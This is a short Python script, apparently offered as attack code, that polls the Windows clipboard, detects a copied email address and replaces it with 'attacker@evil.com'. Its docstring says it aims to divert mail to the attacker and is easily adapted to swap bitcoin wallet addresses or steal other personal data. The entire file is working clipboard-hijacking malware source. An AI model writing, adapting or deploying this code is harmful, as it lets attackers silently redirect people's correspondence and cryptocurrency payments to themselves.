import re
from time import sleep

import win32clipboard

"""
Searches for email addresses copied to the clipboard and overwrites them with 
an attacker's email address in the hopes of having emails sent to the attacker instead
of the intended recipient. Easily updated to replace other strings e.g. bitcoin wallet values 
or to steal other PII.
"""

attacker_email = "attacker@evil.com"
emailregex = "^[a-z0-9]+[\._]?[a-z0-9]+[@]\w+[.]\w{2,3}$"

while True:
    win32clipboard.OpenClipboard()
    data = win32clipboard.GetClipboardData().rstrip()
    print(data)
    if re.search(emailregex, data):
        # Using re.sub() to replace the email in its original copied context might be a better choice
        win32clipboard.EmptyClipboard()
        win32clipboard.SetClipboardText(attacker_email)
        break
    win32clipboard.CloseClipboard()
    sleep(1)
